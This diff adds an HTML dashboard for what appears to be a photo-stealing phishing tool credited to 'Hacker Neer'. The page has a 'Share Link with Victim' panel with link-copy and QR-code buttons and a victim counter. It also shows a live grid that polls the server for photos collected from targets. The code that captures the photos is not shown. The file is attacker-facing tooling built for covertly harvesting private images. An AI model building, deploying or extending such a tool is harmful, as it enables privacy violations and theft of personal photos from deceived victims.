@@ -1,1 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📊 Gallery Collector Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: #1a1a1a;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .header h1 { font-size: 24px; }
+        .credit-box {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            padding: 10px 20px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .credit-box a { color: white; text-decoration: none; font-weight: bold; }
+        .credit-box .youtube { background: #ff0000; padding: 2px 12px; border-radius: 20px; font-size: 12px; display: inline-block; margin-left: 10px; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        .stat-card .number { font-size: 32px; font-weight: bold; color: #667eea; }
+        .stat-card .label { font-size: 12px; color: #999; margin-top: 5px; }
+        .share-box {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .share-box input {
+            width: 100%;
+            padding: 10px;
+            background: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .share-box .btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .photo-card {
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        .photo-card:hover { transform: scale(1.05); }
+        .photo-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .photo-card .info { padding: 10px; font-size: 12px; color: #999; }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            color: #666;
+        }
+        .footer .credit { color: #667eea; font-weight: bold; }
+        .footer .youtube { color: #ff0000; text-decoration: none; }
+        .refresh-btn { background: #333; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
+        .auto-scan-badge { background: #4CAF50; color: white; padding: 3px 10px; border-radius: 20px; font-size: 11px; animation: pulse 1.5s ease-in-out infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>📊 Gallery Collector Dashboard</h1>
+            <span style="background:#4CAF50;padding:5px 12px;border-radius:20px;font-size:12px;">● LIVE</span>
+            <span class="auto-scan-badge" style="margin-left:10px;">🔄 Every 2s</span>
+        </div>
+        <button class="refresh-btn" onclick="refreshData()">🔄 Refresh</button>
+    </div>
+    
+    <div class="credit-box">
+        🔥 <strong>Tool By: Hacker Neer</strong> 🔥
+        <a href="https://youtube.com/@hackerneer" target="_blank" class="youtube">▶️ YouTube: @hackerneer</a>
+    </div>
+    
+    <div class="share-box">
+        <h3>🔗 Share Link with Victim</h3>
+        <input type="text" id="shareLink" readonly>
+        <button class="btn" onclick="copyLink()">📋 Copy Link</button>
+        <button class="btn" onclick="generateQR()">📱 Show QR Code</button>
+    </div>
+    
+    <div class="stats-grid" id="statsGrid">
+        <div class="stat-card"><div class="number" id="totalPhotos">0</div><div class="label">Total Photos</div></div>
+        <div class="stat-card"><div class="number" id="totalSize">0 MB</div><div class="label">Total Size</div></div>
+        <div class="stat-card"><div class="number" id="victimCount">0</div><div class="label">Victims</div></div>
+    </div>
+    
+    <div class="photo-grid" id="photoGrid">
+        <div style="text-align:center;padding:40px;color:#666;grid-column:1/-1;">Loading photos...</div>
+    </div>
+    
+    <div class="footer">
+        <span class="credit">🔥 Tool By: Hacker Neer</span> • 
+        <a href="https://youtube.com/@hackerneer" target="_blank" class="youtube">📺 YouTube: @hackerneer</a>
+    </div>
 
+    <script>
+        document.getElementById('shareLink').value = window.location.origin;
+        
+        function copyLink() {
+            const link = document.getElementById('shareLink');
+            link.select();
+            document.execCommand('copy');
+            alert('✅ Link copied!');
+        }
+        
+        function generateQR() {
+            const link = document.getElementById('shareLink').value;
+            window.open(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${link}`, '_blank');
+        }
+        
+        function refreshData() { loadStats(); loadPhotos(); }
+        
+        function loadStats() {
+            fetch('/api/stats')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.success) {
+                        document.getElementById('totalPhotos').textContent = data.total_photos;
+                        document.getElementById('totalSize').textContent = data.total_size_mb + ' MB';
+                    }
+                })
+                .catch(err => console.error('Error:', err));
+        }
+        
+        function loadPhotos() {
+            fetch('/api/photos')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.success && data.photos.length > 0) {
+                        const grid = document.getElementById('photoGrid');
+                        let html = '';
+                        data.photos.forEach(photo => {
+                            const date = new Date(photo.modified * 1000).toLocaleString();
+                            html += `
+                                <div class="photo-card">
+                                    <img src="${photo.url}" alt="${photo.filename}" loading="lazy">
+                                    <div class="info">
+                                        <div>${photo.filename}</div>
+                                        <div>${date}</div>
+                                        <div>${(photo.size / 1024).toFixed(1)} KB</div>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        grid.innerHTML = html;
+                    }
+                })
+                .catch(err => console.error('Error:', err));
+        }
+        
+        loadStats();
+        loadPhotos();
+        setInterval(() => { loadStats(); loadPhotos(); }, 5000);
+    </script>
+</body>
+</html>
